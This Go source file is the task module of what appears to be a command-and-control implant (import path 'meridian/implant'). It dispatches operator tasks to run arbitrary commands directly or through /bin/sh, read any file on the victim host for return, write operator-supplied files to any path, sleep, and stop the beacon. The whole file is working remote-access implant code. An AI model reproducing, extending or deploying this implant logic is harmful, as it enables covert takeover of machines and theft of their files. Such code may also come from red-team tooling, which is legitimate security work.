// Package mtasks implements the builtin task modules.
package mtasks

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"meridian/implant/internal/mproto"
)

// Run executes a task and returns its result. The stop callback lets
// builtin/exit terminate the beacon.
func Run(t mproto.Task, stop func()) mproto.Result {
	switch t.Module {
	case "builtin/exec":
		return runExec(t)
	case "builtin/shell":
		return runShell(t)
	case "builtin/download":
		return runDownload(t)
	case "builtin/upload":
		return runUpload(t)
	case "builtin/sleep":
		return runSleep(t)
	case "builtin/exit":
		stop()
		return okResult(t.ID, "bye")
	case "builtin/sysinfo":
		return okResult(t.ID, "ok")
	default:
		return errorResult(t.ID, fmt.Errorf("unknown module %q", t.Module))
	}
}

func okResult(id, out string) mproto.Result {
	return mproto.Result{ID: id, Status: "ok", Stdout: []byte(out)}
}

func errorResult(id string, err error) mproto.Result {
	return mproto.Result{ID: id, Status: "error", ExitCode: -1, Stderr: []byte(err.Error())}
}

func timeoutFor(t mproto.Task) time.Duration {
	ttl := t.TTL
	if ttl <= 0 {
		ttl = 120
	}
	return time.Duration(ttl) * time.Second
}

func runCommand(t mproto.Task, argv []string) mproto.Result {
	ctx, cancel := context.WithTimeout(context.Background(), timeoutFor(t))
	defer cancel()
	cmd := exec.CommandContext(ctx, argv[0], argv[1:]...)
	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	r := mproto.Result{ID: t.ID, Stdout: []byte(stdout.String()), Stderr: []byte(stderr.String())}
	if ctx.Err() == context.DeadlineExceeded {
		r.Status = "error"
		r.ExitCode = -1
		r.Stderr = append(r.Stderr, []byte("\ntask timed out")...)
		return r
	}
	if err == nil {
		r.Status = "ok"
		r.ExitCode = 0
		return r
	}
	if ee, ok := err.(*exec.ExitError); ok {
		r.Status = "error"
		r.ExitCode = ee.ExitCode()
		return r
	}
	r.Status = "error"
	r.ExitCode = -1
	r.Stderr = append([]byte(err.Error()+"\n"), r.Stderr...)
	return r
}

// splitCommand performs a minimal shell-style split (handles single/double
// quotes). Falls back to a single-arg command when quoting is malformed.
func splitCommand(cmd string) []string {
	var args []string
	var cur strings.Builder
	var quote rune
	started := false
	for _, r := range cmd {
		switch {
		case quote != 0:
			if r == quote {
				quote = 0
			} else {
				cur.WriteRune(r)
			}
			started = true
		case r == '\'' || r == '"':
			quote = r
			started = true
		case r == ' ' || r == '\t':
			if started {
				args = append(args, cur.String())
				cur.Reset()
				started = false
			}
		default:
			cur.WriteRune(r)
			started = true
		}
	}
	if quote != 0 {
		args = append(args, cmd)
		return args
	}
	if started {
		args = append(args, cur.String())
	}
	return args
}

func runExec(t mproto.Task) mproto.Result {
	cmd, _ := t.Args["command"].(string)
	if cmd == "" {
		return errorResult(t.ID, fmt.Errorf("exec: missing command"))
	}
	return runCommand(t, splitCommand(cmd))
}

func runShell(t mproto.Task) mproto.Result {
	cmd, _ := t.Args["command"].(string)
	if cmd == "" {
		return errorResult(t.ID, fmt.Errorf("shell: missing command"))
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeoutFor(t))
	defer cancel()
	c := exec.CommandContext(ctx, "/bin/sh", "-c", cmd)
	var stdout, stderr strings.Builder
	c.Stdout = &stdout
	c.Stderr = &stderr
	err := c.Run()
	r := mproto.Result{ID: t.ID, Stdout: []byte(stdout.String()), Stderr: []byte(stderr.String())}
	if ctx.Err() == context.DeadlineExceeded {
		r.Status = "error"
		r.ExitCode = -1
		r.Stderr = append(r.Stderr, []byte("\ntask timed out")...)
		return r
	}
	if err == nil {
		r.Status = "ok"
		return r
	}
	if ee, ok := err.(*exec.ExitError); ok {
		r.Status = "error"
		r.ExitCode = ee.ExitCode()
		return r
	}
	r.Status = "error"
	r.ExitCode = -1
	r.Stderr = append([]byte(err.Error()+"\n"), r.Stderr...)
	return r
}

func runDownload(t mproto.Task) mproto.Result {
	path, _ := t.Args["path"].(string)
	if path == "" {
		return errorResult(t.ID, fmt.Errorf("download: missing path"))
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return errorResult(t.ID, err)
	}
	return mproto.Result{ID: t.ID, Status: "ok", Data: data}
}

func runUpload(t mproto.Task) mproto.Result {
	path, _ := t.Args["path"].(string)
	b64, _ := t.Args["data_b64"].(string)
	if path == "" {
		return errorResult(t.ID, fmt.Errorf("upload: missing path"))
	}
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return errorResult(t.ID, fmt.Errorf("upload: bad data_b64: %w", err))
	}
	if err := os.WriteFile(path, data, 0o644); err != nil {
		return errorResult(t.ID, err)
	}
	return okResult(t.ID, fmt.Sprintf("wrote %d bytes to %s", len(data), path))
}

func runSleep(t mproto.Task) mproto.Result {
	if s, ok := t.Args["interval"].(float64); ok && s > 0 {
		time.Sleep(time.Duration(s) * time.Second)
		return okResult(t.ID, fmt.Sprintf("slept %ds", int(s)))
	}
	if s, ok := t.Args["interval"].(string); ok {
		if d, err := time.ParseDuration(s + "s"); err == nil {
			time.Sleep(d)
			return okResult(t.ID, fmt.Sprintf("slept %s", d))
		}
	}
	return okResult(t.ID, "no interval provided, skipped")
}
